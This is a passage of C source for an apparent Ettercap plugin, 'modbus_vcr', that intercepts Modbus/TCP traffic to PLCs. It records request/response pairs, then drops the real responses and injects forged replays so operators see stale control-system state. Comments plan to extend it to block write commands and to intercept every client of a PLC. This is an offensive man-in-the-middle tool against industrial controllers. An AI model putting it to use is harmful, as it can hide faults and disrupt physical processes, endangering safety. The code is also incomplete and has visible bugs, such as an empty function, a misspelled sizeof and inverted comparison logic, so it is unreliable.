#include <ec.h>
#include <ec_stdint.h>
#include <ec_inet.h>
#include <ec_plugins.h>
#include <ec_hook.h>
#include <ec_send.h>
#include <ec_socket.h>
#include <ec_threads.h>
#include <ec_decode.h>
#include <ec_session.h>
#include <sys/wait.h> // really necessary?

#include <sys/time.h>

#ifdef HAVE_PCRE_H
#include <pcre.h>
#endif
#ifdef OS_LINUX
#include <linux/netfilter_ipv4.h>
#endif

#ifdef HAVE_SYS_POLL_H
#include <sys/poll.h>
#endif


#define BREAK_ON_ERROR(x,y,z) do {  \
   if (x == -E_INVALID ) {            \
	 printf("BREAK_ON_ERROR: x is %d, -E_INVALID is %d", x, -E_INVALID); \
     modbus_wipe_connection(y);      \
     SAFE_FREE(z.DATA.data);       \
     SAFE_FREE(z.DATA.disp_data);  \
     ec_thread_exit();             \
   }                                \
} while(0)



/* TODO: make a special configuration option to deny control.
 * We'd do this by capturing 'write' commands, spoofing dummy 'read' requests to
 * the controller, and then forging a response as though the 'write' was requested
 * (overwriting the 'read' data from our dummy read request)
 * This would keep the Tcp sequence numbers in step to avoid any disconnects :).
 */

/* Function prototypes */
static size_t modbus_vcr_create_ident(void **i, struct packet_object *po);
static int modbus_vcr_match(void *id_sess, void *id_curr);
static int modbus_vcr_init(void *modbus_vcr);
static int modbus_vcr_fini(void *modbus_vcr);
static void record_modbus(struct packet_object *po);
static int modbus_insert_redirect(u_int16 dport);
static int modbus_remove_redirect(u_int16 dport);

/* thread stuff */
static int modbus_bind_wrapper(void);
static EC_THREAD_FUNC(modbus_child_thread);
static EC_THREAD_FUNC(modbus_accept_thread);

#define PO_FROMMODBUSVCR ((u_int16)(1<<14))

struct plugin_ops modbus_vcr_ops = {
  .ettercap_version = EC_VERSION,
  .name = "modbus_vcr",
  .info = "A plugin for recording and replaying control systems state using the Modbus protocol",
  .version = "0.1",
  .init = &modbus_vcr_init,
  .fini = &modbus_vcr_fini,
};

#define MODBUS_MAX 65535

// Modbus session identifier
struct modbus_ident{
	struct timeval start_time; // Starting time of the 
	struct ip_addr slave_ip_addr; //L3_dst; // IP dst, slave address?
	struct ip_addr master_ip_addr; //L3_src; // IP source, master address?
	u_int16 master_port; //L4_src; // tcp source, master port
	u_int16 slave_port; //L4_dst; // tcp dest, slave port, should be 502
};


// given a struct ip_addr, return a char*
// could be use for strcmp'ing, etc
// DANGER this assumes ipv4 for now
char* ip_addr_to_str(struct ip_addr *ipaddr){
	
}


#define MODBUS_IDENT_LEN sizeof(struct modbus_ident)

// This isn't used yet (meant for a later more advanced version)
// In the future we'll make the plugin track more detailed state about the PLC
// So that we can handle unexpected/not-seen-before requests and give them
// rational answers.
typedef struct modbus_item {
    unsigned char functionCode;
    u_int16 target; /* requested target */
    unsigned char length; /* total length of the observed operation */
    /* note that modbus uses a two byte length field, the spec specifically limits
     * number of elements to 125 though...we may need to expand this for devices
     * which violate the standard, as it seems like that will occur someday... */
    unsigned char* value; /* we'll use the whole byte by packing */
    struct timeval ts; /* time it was observed.  Our plugin will need to track what time it started recording...*/
	} modbus_item_t;
	
typedef struct modbus_request_response_pair {
	unsigned char *requestData;
	int requestDataLen;
	unsigned char *responseData;
	int responseDataLen;
	struct timeval requestTs; /* relative time that the request occured (offset from start of session) */
	} modbus_request_response_pair_t;
  
// We'll have to make a global list of these...
typedef struct request_response_item {
	modbus_request_response_pair_t mrrp;
	struct request_response_item *next;
	} request_response_list_t;

// Used for session information storage
typedef struct session_data {
	struct request_response_item *head_request_response_item;
	struct request_response_item *current_request_response_item;
	// I also want to store the 'Server' (PLC) IP address
	struct ip_addr *plc_ip_addr;
	struct timeval starttime;
	unsigned char done_recording; // used for tracking our ten-second record state, we could just do math instead...
	} session_data_t;

struct modbus_connection {
	int fd;
	u_int16 port[2];
	struct ip_addr ip[2];
	struct modbus_request *request;
	struct modbus_response *response;
	char modbus_err[2048]; // should be enough to hold any modbus error message
	#define MODBUS_CLIENT 0
	#define MODBUS_SERVER 1
};

//static void modbus_handle_request(struct modbus_connection *connection, struct packet_object *po);
static void modbus_handle_request(struct packet_object *po);


// placeholder for parsing modbus requests
// we're doing this a crappy way, just stodring the
// request as an array of bytes.
// note modbus request may contain null bytes all over the place...
struct modbus_request {
	char *payload;
};
struct modbus_response {
	char *payload;
};

// This is a kludge to speedup getting the most recent request/response
// pair.  Prevents us from walking the whole list to get the last element.
// In reality this should not be a global, it should be stored in
// the session state somehow...
static struct request_response_item *g_current_request_response_item;

/* globals */
static int main_fd;
static u_int16 bind_port;
static struct pollfd poll_fd;

static EC_THREAD_FUNC(modbus_accept_thread){
	struct modbus_connection *connection;
	u_int len = sizeof(struct sockaddr_in);
	struct sockaddr_in client_sin;
	int optval = 1; // ???
	socklen_t optlen = sizeof(optval);
	ec_thread_init();
	
	DEBUG_MSG("Modbus_VCR: modbus_accept_thread initialized and ready");
	
	poll_fd.fd = main_fd;
	poll_fd.events = POLLIN;
	LOOP{
		poll(&poll_fd, 1, -1);
		
		if (poll_fd.revents & POLLIN){
			SAFE_CALLOC(connection, 1, sizeof(struct modbus_connection));
			BUG_IF(connection == NULL);
			
			SAFE_CALLOC(connection->request, 1, sizeof(struct modbus_request));
			BUG_IF(connection->request == NULL);
			
			SAFE_CALLOC(connection->response, 1, sizeof(struct modbus_response));
			BUG_IF(connection->response == NULL);
			
			connection->fd = accept(poll_fd.fd, (struct sockaddr *)&client_sin, &len);
			
			DEBUG_MSG("Modbus_vcr: Received connection: %p %p\n", connection, connection->request);
			if(connection->fd == -1){
				SAFE_FREE(connection->request);
				SAFE_FREE(connection->response);
				SAFE_FREE(connection);
				continue;			
			}
			ip_addr_init(&(connection->ip[MODBUS_CLIENT]), AF_INET, (char *)&client_sin.sin_addr.s_addr);
			connection->port[MODBUS_CLIENT] = client_sin.sin_port;
			connection->port[MODBUS_SERVER] = htons(502);
			if (setsockopt(connection->fd, SOL_SOCKET, SO_KEEPALIVE, &optval, optlen) < 0) {
				DEBUG_MSG("SSLStrip: Could not set up SO_KEEPALIVE");
			}
			ec_thread_new_detached("modbus_child_thread", "modbus child", &modbus_child_thread, connection, 1);
			
		}
	}
	return NULL;
}

static int modbus_get_peer(struct modbus_connection *connection)
{

#ifndef OS_LINUX
	struct ec_session *s = NULL;
	struct packet_object po;
	void *ident= NULL;
	int i;

	memcpy(&po.L3.src, &connection->ip[MODBUS_CLIENT], sdizeof(struct ip_addr));
	po.L4.src = connection->port[MODBUS_CLIENT];
	po.L4.dst = connection->port[MODBUS_SERVER]; 

	modbus_create_ident(&ident, &po);

#ifndef OS_WINDOWS
	struct timespec tm;
	tm.tv_sec = 0;
	tm.tv_nsec = 50; // wait 50 nsecs for a response (should be fast!)
#endif

	/* Wait for sniffing thread */
	for (i=0; i<5 && session_get_and_del(&s, ident, MODBUS_IDENT_LEN)!=E_SUCCESS; i++)
#ifndef OS_WINDOWS
	nanosleep(&tm, NULL);
#else	
	usleep(10);
#endif

	if (i==5) { // RETRY
		SAFE_FREE(ident);
		return -E_INVALID;
	}

	memcpy(&connection->ip[MODBUS_SERVER], s->data, sizeof(struct ip_addr));

	SAFE_FREE(s->data);
	SAFE_FREE(s);
	SAFE_FREE(ident);
#else
	 struct sockaddr_in sa_in;
	 socklen_t sa_in_sz = sizeof(struct sockaddr_in);
	 getsockopt (connection->fd, SOL_IP, SO_ORIGINAL_DST, (struct sockaddr*)&sa_in, &sa_in_sz);

	 ip_addr_init(&(connection->ip[MODBUS_SERVER]), AF_INET, (char *)&(sa_in.sin_addr.s_addr));
#endif

	
	return E_SUCCESS;

}


static int modbus_sync_conn(struct modbus_connection *connection){
	if(modbus_get_peer(connection) != E_SUCCESS)
		return -E_INVALID;
	set_blocking(connection->fd, 0);
	return E_SUCCESS;
}

static int modbus_read(struct modbus_connection *connection, struct packet_object *po)
{
	int len = 0;
	//printf("-->modbus_read() performing read for %d bytes\n", MODBUS_MAX);
	len = read(connection->fd, po->DATA.data, MODBUS_MAX); // duh, this must block until it gets enough data?
	//printf("-->modbus_read() read finished\n");

	po->DATA.len = len;
	if (len > 0){
		printf("-->modbus_read() returning %d bytes\n", len);
	}
	if(len < 0){ // going out on a limb here, changing from <= 0 to <0 KRW
		if (errno == EAGAIN){
			return len; // should be 0 in this case
		}
		printf("Error encountered on read(), error is %d\n", errno);
		return -E_INVALID;
	}
	return len;	
}

static void modbus_parse_packet(struct modbus_connection *connection, int direction, struct packet_object *po)
{
	FUNC_DECODER_PTR(start_decoder);
	int len;

	memcpy(&po->L3.src, &connection->ip[direction], sizeof(struct ip_addr));
	memcpy(&po->L3.dst, &connection->ip[!direction], sizeof(struct ip_addr));
	
	po->L4.src = connection->port[direction];
	po->L4.dst = connection->port[!direction];

	po->flags |= PO_FROMMODBUSVCR;	
	/* get time */
	gettimeofday(&po->ts, NULL);

	switch(ip_addr_is_local(&PACKET->L3.src, NULL)) {
		case E_SUCCESS:
			PACKET->PASSIVE.flags &= ~FP_HOST_NONLOCAL;
			PACKET->PASSIVE.flags |= FP_HOST_LOCAL;
			break;
		case -E_NOTFOUND:
			PACKET->PASSIVE.flags &= ~FP_HOST_LOCAL;
			PACKET->PASSIVE.flags |= FP_HOST_NONLOCAL;
			break;
		case -E_INVALID:
			PACKET->PASSIVE.flags = FP_UNKNOWN;
			break;
	}

	/* let's start from the last stage of decoder chain */
	// KRW I don't get what this is doing, where is the decoder function pointer from?
	//DEBUG_MSG("SSLStrip: Parsing %s", po->DATA.data);
	printf("modbus_parse_packet(): po flags is %04x", po->L4.flags);
	start_decoder = get_decoder(APP_LAYER, PL_DEFAULT); // get application layer decoder, default type
	start_decoder(po->DATA.data, po->DATA.len, &len, po);
}

static void modbus_initialize_po(struct packet_object *po, u_char *p_data, size_t len)
{
   /* 
    * Allocate the data buffer and initialize 
    * fake headers. Headers len is set to 0.
    * XXX - Be sure to not modify these len.
    */

	
   memset(po, 0, sizeof(struct packet_object));

   if (p_data == NULL) {
      SAFE_FREE(po->DATA.data);
      SAFE_CALLOC(po->DATA.data, 1, MODBUS_MAX);
      po->DATA.len = MODBUS_MAX;
      BUG_IF(po->DATA.data==NULL);
   } else {
      SAFE_FREE(po->DATA.data);
      po->DATA.data = p_data;
      po->DATA.len = len;
   }

   po->L2.header  = po->DATA.data;
   po->L3.header  = po->DATA.data;
   po->L3.options = po->DATA.data;
   po->L4.header  = po->DATA.data;
   po->L4.options = po->DATA.data;
   po->fwd_packet = po->DATA.data;
   po->packet     = po->DATA.data;

   po->L3.proto = htons(LL_TYPE_IP);
   po->L3.ttl = 64;
   po->L4.proto = NL_TYPE_TCP;

}

static void modbus_wipe_connection(struct modbus_connection *connection)
{
	DEBUG_MSG("SSLStrip: http_wipe_connection");
	close_socket(connection->fd);

	if(connection->response->payload)
		SAFE_FREE(connection->response->payload);

	if(connection->request->payload)
		SAFE_FREE(connection->request->payload);

	if(connection->request)
		SAFE_FREE(connection->request);

	if(connection->response)
		SAFE_FREE(connection->response);

	if (connection)
		SAFE_FREE(connection);
}

// Code below never gets used now
EC_THREAD_FUNC(modbus_child_thread){
	struct packet_object po;
	int ret_val;
	struct modbus_connection *connection;
	connection = (struct modbus_connection *)args;
	ec_thread_init();
	
	/* Get peer, set to non-blocking */
	if (modbus_sync_conn(connection) == -E_INVALID){
		DEBUG_MSG("Modbus_vcr: Could not get peer!");
		printf("Modbus_vcr: Could not get peer!\n");
		if (connection->fd != -1)
			close_socket(connection->fd);
		SAFE_FREE(connection->response);
		SAFE_FREE(connection->request);
		SAFE_FREE(connection);
		ec_thread_exit();
	}
	
	// we'll send a syn+ack...
	modbus_initialize_po(&po, NULL, 0);
	po.len = 64;
	po.L4.flags = (TH_SYN | TH_ACK);
	//packet_disp_data(&po, po.DATA.data, po.DATA.len); // not sure if we need to do this?
	modbus_parse_packet(connection, MODBUS_SERVER, &po);
	modbus_initialize_po(&po, po.DATA.data, po.DATA.len);
	// do we need to send this packet somehow?  It seems to happen automatically (maybe by a calling function?)
	
	printf("-->modbus_child_thread() initialized and running\n");
	LOOP{
		//printf("--> modbus_child_thread(): about to initialize po\n");
		modbus_initialize_po(&po, NULL, 0);
		//printf("--> modbus_child_thread(): about to modbus_read()\n");
		ret_val = modbus_read(connection, &po);
		DEBUG_MSG("modbus_vcr: Returned %d", ret_val);
		//printf("--> modbus_child_thread(): modbus_vcr: modbus_read() Returned %d\n", ret_val);
		BREAK_ON_ERROR(ret_val, connection, po);
		//printf("--> modbus_child_thread(): did not break on error (yay)\n");
		if (ret_val > 0) {
			po.len = po.DATA.len;
			po.L4.flags |= TH_PSH;
			po.DATA.data[po.DATA.len] = 0;
			packet_destroy_object(&po);
			packet_disp_data(&po, po.DATA.data, po.DATA.len); // might not be a good idea...
			printf("--> modbus_child_thread(): calling modbus_handle_request()\n");
			//modbus_handle_request(connection, &po);
			modbus_handle_request(&po);
		}else{
			// we want to at least free our po, right?
			// modbus_initialize_po re-uses most of the the data...
			SAFE_FREE(po.DATA.data); // but it allocates a new data pointer
			// so since the returned data was empty, we'll just free it (it will
			// probably be re-allocated in a moment :))
		}
		
	}
	printf("--> modbus_child_thread(): exiting\n");
	return NULL;
}

 /* Subtract the `struct timeval' values X and Y,
    storing the result in RESULT.
    Return 1 if the difference is negative, otherwise 0.  */

int timeval_subtract (result, x, y)
      struct timeval *result, *x, *y;
 {
   /* Perform the carry for the later subtraction by updating y. */
   if (x->tv_usec < y->tv_usec) {
     int nsec = (y->tv_usec - x->tv_usec) / 1000000 + 1;
     y->tv_usec -= 1000000 * nsec;
     y->tv_sec += nsec;
   }
   if (x->tv_usec - y->tv_usec > 1000000) {
     int nsec = (x->tv_usec - y->tv_usec) / 1000000;
     y->tv_usec += 1000000 * nsec;
     y->tv_sec -= nsec;
   }

   /* Compute the time remaining to wait.
      tv_usec is certainly positive. */
   result->tv_sec = x->tv_sec - y->tv_sec;
   result->tv_usec = x->tv_usec - y->tv_usec;

   /* Return 1 if result is negative. */
   return x->tv_sec < y->tv_sec;
 }
// Apparently plugin_load is called by ettercap to load the plugin...
int plugin_load(void *handle){
    DEBUG_MSG("modbus_vcr plugin load function");
	printf("modbus_vcr: calling plugin_register()\n");
    return plugin_register(handle, &modbus_vcr_ops);
    }

static int modbus_vcr_init(void *modbus_vcr){
	printf("modbus_vcr_init() called\n");
	/*if (modbus_bind_wrapper() != E_SUCCESS) {
		ERROR_MSG("Modbus_vcr: Could not set up modbus redirect\n");
		return PLUGIN_FINISHED;
	}*/

    //hook_add(HOOK_FILTER, &record_modbus); // we might want HOOK_PRE_FORWARD?
    hook_add(HOOK_PRE_FORWARD, &record_modbus);

	//ec_thread_new_detached("modbus_accept_thread", "Modbus Accept thread", &modbus_accept_thread, NULL, 1);

    USER_MSG("modbus_vcr: plugin running...\n");
    return PLUGIN_RUNNING;
}

static int modbus_vcr_fini(void *modbus_vcr){
	DEBUG_MSG("Modbus_vcr: Removing redirect (warning, memory leaks exist due to global storage)\n");
	if (modbus_remove_redirect(bind_port) == -E_FATAL) {
		ERROR_MSG("Unable to remove HTTP redirect, please do so manually");
	}
	pthread_t pid = ec_thread_getpid("modbus_accept_thread");
	if (!pthread_equal(pid, EC_PTHREAD_NULL))
		ec_thread_destroy(pid);
	do {
		pid = ec_thread_getpid("modbus_child_thread");
		if (!pthread_equal(pid, EC_PTHREAD_NULL))
			ec_thread_destroy(pid);
	} while (!pthread_equal(pid, EC_PTHREAD_NULL));

	close(main_fd);

    hook_del(HOOK_FILTER, &record_modbus);
    USER_MSG("modbus_vcr: plugin finished\n");
	// TODO: clean up all of the memory used by our linked list of request-response pairs!
    return PLUGIN_FINISHED;
}

static int modbus_vcr_is_modbus(struct packet_object *po){
    printf("modbus_vcr_is_modbus called\n");
	if (po->L4.proto != NL_TYPE_TCP)
		return 0;
	if (ntohs(po->L4.dst) == (unsigned short) 502 || ntohs(po->L4.src) == (unsigned short) 502) // bug here, whoops
		return 1;
	// Anything else that could be used to identify a packet as modbus?
	// Preferably stuff that isn't too cpu-intensive...
	return 0;
}

/* session matcher
 * compares the session of the input packet id_curr to see if it matches
 * the existing session id_sess 
 * returns 0 if it's a non-matching session, or 1 if it's the existing session */
static int modbus_vcr_match(void *id_sess, void *id_curr){
    struct modbus_ident *ids = id_sess;
    struct modbus_ident *id = id_curr;
    /* sanity checks */
    BUG_IF(ids == NULL);
    BUG_IF(id == NULL);
    
	// Really we just want to check the source and destination IP addresses,
	// and the destination TCP port...
    if (ids->slave_port == id->slave_port &&
        !ip_addr_cmp(&ids->master_ip_addr, &id->master_ip_addr))
        return 1;
    return 0;
}

// Given a modbus packet, create a new ident structured based on the packet.
// identity is just based on destination port and source ip, really, although
// we capture more detail than that
//
// a major problem is: ident will be different if we're seeing a slave packet
// or a master packet :(.
// I'm going to decide that whichever has tcp/502 is the slave packet 
static size_t modbus_vcr_create_ident(void **i, struct packet_object *po){
	struct modbus_ident *ident;
	unsigned short mbport = 502;
	SAFE_CALLOC(ident, 1, sizeof(struct modbus_ident));
	if (ntohs(po->L4.src) == mbport){
		memcpy(&(ident->master_ip_addr), &(po->L3.dst), sizeof(struct ip_addr));
		memcpy(&(ident->slave_ip_addr), &(po->L3.src), sizeof(struct ip_addr));
		//ident->L4_src = po->L4.src;
		// if you want to 'improve' the mitm, remote the source port
		// (maybe even the source ip)
		// that way you mitm everybody connecting to the PLC with the same vcr data
		ident->master_port = po->L4.dst; //po->L4.src;
		//ident->L4_dst = po->L4.dst;
		ident->slave_port = po->L4.src; // po->L4.dst;
	}else if(ntohs(po->L4.dst) == mbport){
		memcpy(&(ident->master_ip_addr), &(po->L3.src), sizeof(struct ip_addr));
		memcpy(&(ident->slave_ip_addr), &(po->L3.dst), sizeof(struct ip_addr));
		ident->master_port = po->L4.src; // po->L4.dst;
		ident->slave_port = po->L4.dst; //po->L4.src;
	}else{
		printf("****Not a Modbus packet????****\n");
	}
	*i = ident;
	return sizeof(struct modbus_ident);
}


// "create_session" is a bit of a misnomer.  We are creating a session,
// but the session identifier might exist already in the global session list.
// Really we should build an identifier, look through the global session list
// for that identifier, and fill 's' with that session if it exists
static void modbus_vcr_create_session(struct ec_session **s, struct packet_object *po){
	struct timeval session_start_timeval;
    void *ident;
    DEBUG_MSG("modbus_vcr_create_session");
	printf("modbus_vcr_create_session() called\n");
    SAFE_CALLOC(*s, 1, sizeof(struct ec_session));
    
    (*s)->ident_len = modbus_vcr_create_ident(&ident, po);
    // adds a session identifier to uniquely identify this session
    (*s)->ident = ident;
    // the matching function.  It tells if (1) the conversation is a modbus stream
    // and (2) if the input session matches the target conversation.
    (*s)->match = modbus_vcr_match;
	// NO!
    //SAFE_CALLOC((*s)->data, 1, sizeof(struct ip_addr));
	SAFE_CALLOC((*s)->data, 1, sizeof(struct session_data)); // used for tracking session globals, not IP address?
	
	gettimeofday(&((struct session_data *)(*s)->data)->starttime, 0); // should be session data somewhere...
	
	SAFE_CALLOC( ((struct session_data *)(*s)->data)->plc_ip_addr, 1, sizeof(struct ip_addr));
	printf("modbus_vcr_create_session() exited\n");
}

// Function purpose: take a modbus request (read,write,etc)
// Issue the command to the PLC, get the response, record data in
// Add the request/response pair to the session's list
/*static modbus_item_t handle_modbus_request_packet(struct packet_object *po, struct ec_session *s){
	return m
}*/

// Tell if our session is expecting a request or a response
// Two possible ways to infer this: state-tracking, or ip address
// returns 0 if it's not a request, 1 if it is a request
static int is_request(struct ec_session *s, struct packet_object *po){
	struct ip_addr master_ip_addr = ((struct modbus_ident *)s->ident)->master_ip_addr;
	struct ip_addr src_ip_addr = po->L3.src;
	// For debugging purposes...
	int master_ip;
	int src_ip;
	master_ip = ntohl(((struct modbus_ident *)s->ident)->master_ip_addr.addr);
	src_ip = ntohl(po->L3.src.addr);
	// end of for debugging purposes...
	//printf("is_request() called\n");
	
	// basically compare the ip address of master_ip_address to po->L3.src
	//printf("src ip: %d.%d.%d.%d, master ip: %d.%d.%d.%d\n", src_ip_addr.addr[0], src_ip_addr.addr[1], src_ip_addr.addr[2], src_ip_addr.addr[3], master_ip_addr.addr[0], master_ip_addr.addr[1], master_ip_addr.addr[2], master_ip_addr.addr[3]);
	if (ntohs(po->L4.dst) == (unsigned short) 502){
//	if (ntohl(((struct modbus_ident *)s->ident)->master_ip_addr.addr) == ntohl(po->L3.src.addr)){
//	if (memcmp((void *)&((struct modbus_ident *)s->ident)->master_ip_addr, (void *)&po->L3.src, sizeof(struct ip_addr))){
	//	printf("--> request detected\n");
		return 1;
	}else{
	//	printf("--> not a request detected\n");
		return 0;
	}
}


static void find_request_response_pair(struct request_response_item **output_request_response_item, u_char *requestdata, size_t requestlen, struct request_response_item *head_request_response_item){
	struct request_response_item *curr = head_request_response_item;
	// walk through the list
	
	while (curr != NULL){
		if ((curr->mrrp.requestDataLen == requestlen) &&
			memcmp(curr->mrrp.requestData, requestdata, requestlen)){
			*output_request_response_item = curr;
			return;
		}
		curr = curr->next; // potential null pointer dereference
	}
	return;
}

/* requires major fixup */
//static void modbus_handle_request(struct modbus_connection *connection, struct packet_object *po){
static void modbus_handle_request(struct packet_object *po){

	struct timeval timeval_sessionstart, timeval_now;
	modbus_request_response_pair_t *temp_request_response_pair;
	request_response_list_t *temp_request_response_item;
	session_data_t tempSessionData;
    u_char *ptr;
    u_char *tempdata;
    u_char *newresp;
    int i;
    int newlen;
	printf("modbus_handle_request() called\n");
	if (po->flags & PO_FORWARDABLE){
		printf("--> packet is forwardable...\n");
	}else{
		printf("--> packet is NOT forwardable...\n");
	}
	struct ec_session *temp_s = NULL;
	struct ec_session *s = NULL;
	// make a session object out of the packet
	modbus_vcr_create_session(&temp_s, PACKET);
	if (temp_s != NULL){
		printf("--> session created\n");
	}
	// look up the session FIXME
	printf("--> finding associated session\n");
	session_get(&s, temp_s->ident, temp_s->ident_len);
	if (s != NULL){
		printf("--> Session found!\n");
	}else{
		printf("--> Session not found :(\n");
		// what should we do?
		return;
	}
	// if this is the first packet, we'll need to do this
	// might consider kicking this out of the request handler and into session setup...
	if (((session_data_t*)s->data)->current_request_response_item == NULL){
		printf("--> calloc'ing a new current_request_response_item\n");
		// this must be our first request, so we'll malloc one
		SAFE_CALLOC(((session_data_t*)s->data)->current_request_response_item, 1, sizeof(struct request_response_item));
	}
	// get the state pointer */
	if ((((session_data_t*)s->data)->current_request_response_item) != NULL){
		printf("--> collecting temp_request_response_pair\n");
		temp_request_response_pair = &((session_data_t*)s->data)->current_request_response_item->mrrp;
	}
	// Assign head of session data, if required.
	// We'll walk down his list later when replaying responses
	if ((((session_data_t*)s->data)->head_request_response_item) == NULL){
		((session_data_t*)s->data)->head_request_response_item = ((session_data_t*)s->data)->current_request_response_item;
	}
	// first, get our start time. tz is null, this okay?
	timeval_sessionstart = ((session_data_t*)s->data)->starttime;
	
	// In phase 1, we're just recording statuses to get
	// the lay of the land.
	// Let's start with 10 seconds of data for a loop.
	// We could perhaps let the user define this.
	if (0 == ((session_data_t*)s->data)->done_recording){ 
		gettimeofday(&timeval_now, 0);
		printf("session started at %ld, time now %ld\n", timeval_sessionstart.tv_sec, timeval_now.tv_sec);
		if (timeval_now.tv_sec > (timeval_sessionstart.tv_sec + 10)){
			// time expired, done recording
			printf("--> session done recording!");
			((session_data_t*)s->data)->done_recording = 1;
		}
		else{
			printf("--> recording data\n");
			// record some data with time offset
			// first: is this a request or a response?
			// we'll make an is_request() function which takes
			// the current session.  Session will have to track this
			// in state data somehow (we'll figure this out)
			if (is_request(s, PACKET)){
				printf("--> recording request\n");
				// Assume that it's a request, we'll store the request data
				// in the session somehow
				// we'll need to allocate a new request/response pair
				SAFE_CALLOC(temp_request_response_pair, 1, sizeof(modbus_request_response_pair_t));
				// then we'll fill it up
				SAFE_CALLOC(temp_request_response_pair->requestData, 1, PACKET->DATA.len);
				// then we'll copy the request
				printf("--> memcopying packet data into temp request\n");
				memcpy(temp_request_response_pair->requestData, PACKET->DATA.data, PACKET->DATA.len);
				temp_request_response_pair->requestDataLen = PACKET->DATA.len;
				// make a new request_response_item on global list
				printf("--> mallocing next item\n");
				SAFE_CALLOC(((session_data_t*)s->data)->current_request_response_item->next, 1, sizeof(request_response_list_t));
				// advance to newly allocated object...that we never allocated or assigned yet, hahahaha
				printf("--> next was assigned (though maybe it didn't have to be)\n");
				// now how do we say 'forward this packet on'?
				po->flags |= PO_MODIFIED; // ?
				if (po->flags & PO_FORWARDABLE){
					printf("--> packet is forwardable...\n");
				}
			}else{ // we're going here, but the printf never gets hit, we get a segfault
				printf("--> *************recording response\n");
				// Assume that it's a response, we'll need to recover the request_response_pair from the session
				// Let's make this silly function that grabs the most recent pair from the session
				// we should probably store these as an array or something...or use a trick to speed up
				// retrieval
				// we might just want to allocate a big chunk of pairs in the beginning and assume that we won't
				// exceed some limit?
				// I used global g_current_request_response_item for this
				printf("--> gathering mrrp pointer\n");
				if (temp_request_response_pair == NULL){
					printf("--> NULL request response pair!\n");
				}
				/*if (mrrp == NULL){
					SAFE_CALLOC(temp_request_response_pair, 1, sizeof())
				}*/
				// we used to deref mrrp from temp_request_response_item->mrrp here
				printf("--> callocing responseData\n");
				SAFE_CALLOC(temp_request_response_pair->responseData, 1, PACKET->DATA.len);
				printf("--> memcopying packet data\n");
				memcpy(temp_request_response_pair->responseData, PACKET->DATA.data, PACKET->DATA.len);
				printf("--> setting packet length\n");
				temp_request_response_pair->responseDataLen = PACKET->DATA.len;
						
			} /* if is_request(&s) */
		} /* if (timeval_now.tv_sec > (timeval_sessionstart.tv_sec + 10)) */
	} /* if(0 == g_done_recording) */

	else{ /* if (0 == g_done_recording) */
		if (is_request(s, PACKET)){
			// Now we're done recording data, we'll handle all new requests by sending them to the PLC
			// and then overwriting the response
			// This is the request part, we don't want to modify it (that could destroy the PLC :))
			// Look up the request so that our global points to it
			//temp_request_response_pair
			// Look up the request on our session
			//find_request_response_pair(&s);
			if (PACKET->DATA.len != 0){
				printf("--> Got a request packet on an established session\n"); // need to look up what the response should be, and point to it somehow
				// Start by comparing the packet data to our current_request_response_item->mrrp->request_item
				// this is an optimization to be completed later.
				// &((session_data_t*)s->data)->current_request_response_item
				// if it didn't match, start over at the beginning of the list
				// this function will search all request response items starting with head for the pair that has request 'data'.
				// it will assign current_request_response_item to point at the pair, so that the pair will already be lined up for overwriting
				// the response.
				find_request_response_pair(&((session_data_t*)s->data)->current_request_response_item, PACKET->DATA.data, PACKET->DATA.len, &((session_data_t*)s->data)->head_request_response_item);

				
			}
		}else{ /* is_request(s, PACKET) */
			if (PACKET->DATA.len != 0){
				if(&((session_data_t*)s->data)->current_request_response_item == NULL){
					printf("--> ERROR: request was not in list, try expanding time of packet capture. Allowing response through\n");
					return;
				}
				// overwrite response data and data length with saved values
				printf("I would be overwriting data now\n");
                printf("The data that I would be overwriting: ");
                for(i = 0; i < PACKET->DATA.len; i++){
                    printf("%02x ", PACKET->DATA.data[i]);
                }
                printf("\n");
                
                printf("The data that I would be overwriting it with: ");
                for(i = 0; i < ((session_data_t*)s->data)->current_request_response_item->mrrp.responseDataLen; i++){
                    printf("%02x ", ((session_data_t*)s->data)->current_request_response_item->mrrp.responseData[i]);
                }
                printf("\n");
				// free PACKET->DATA.data, copy our data to PACKET->DATA.data, set length to our length
				//printf("Freeing old data\n"); // why would this cause us to crash
				/*SAFE_FREE(PACKET->DATA.data);
				printf("setting new length\n");
				PACKET->DATA.len = ((session_data_t*)s->data)->current_request_response_item->mrrp.responseDataLen;
                printf("New length is %d", PACKET->DATA.len);
				printf("allocating moar buffer\n");
				SAFE_CALLOC(PACKET->DATA.data, 1, PACKET->DATA.len);
				printf("copying saved buffer into packet\n");
				memcpy(PACKET->DATA.data, &((session_data_t*)s->data)->current_request_response_item->mrrp.responseData, 
					PACKET->DATA.len);*/
                
                // Overwriting the market byte works fine if we don't do the above code (safe free the data, then safe calloc the data, then memcpy
                // I wish I understood why...
                //printf("Shrinking data length (test)");
                //po->DATA.delta = 2;
                /* Stuff below is the good stuff */
                newlen = ((session_data_t*)s->data)->current_request_response_item->mrrp.responseDataLen;
                newresp = ((session_data_t*)s->data)->current_request_response_item->mrrp.responseData;
                
                
                SAFE_CALLOC(tempdata, newlen, sizeof(u_char));
                
                memset(tempdata, 0, newlen); // zero out buffer
                memcpy(tempdata, newresp, newlen); // copy previously recorded response into buffer
                tempdata[1] = 0x41;
                // send fake reply
                send_tcp(&po->L3.src, &po->L3.dst, po->L4.src, po->L4.dst, po->L4.seq, po->L4.ack, po->L4.flags, tempdata, newlen);
                /* Stuff above is the good stuff */
                
                /*printf("Appending data to the packet\n");
                po->DATA.inject_len = 2;
                SAFE_CALLOC(tempdata, 1, 2);
                tempdata[0] = 0x41;
                tempdata[1] = 0x41;
                po->DATA.inject = tempdata;
                // Going to re-attempt to write the code above, but a little more sanely...
                ptr = (u_char *)po->DATA.data;
                
                
				printf("overwriting marker byte on data\n");
				ptr[1] = 0x01; // Just a sanity check to make sure the modification is happening
				printf("checksum sanity: tcp header length is %d\n", PACKET->L4.len);
				printf("OS_SIZOF_P is %d\n", OS_SIZEOF_P);*/
				// mark packet to get updated checksums
				po->flags |= PO_DROPPED;  // or should it be forged?
			} /* PACKET->DATA.len != 0 */
		} /* else { // if (is_request(s, packet) */
	} /* if ! (0 == g_done_recording) */
	
	printf("modbus_handle_request() exiting...\n");
	// Should packet be automatically forwarded now?
}

static void record_modbus(struct packet_object *po){
	struct timeval timeval_sessionstart, timeval_now;
	int g_done_recording = 0; // this should be a part of the state management
	modbus_request_response_pair_t *temp_request_response_pair;
	request_response_list_t *temp_request_response_item;
	session_data_t tempSessionData;
    // first need to determine if it's a modbus packet...
    if (!modbus_vcr_is_modbus(po)){
		printf("*******Non-modbus packet detected!*******\n");
		return;
	}else{
        printf("*******Modbus packet detected!*******\n");
    }
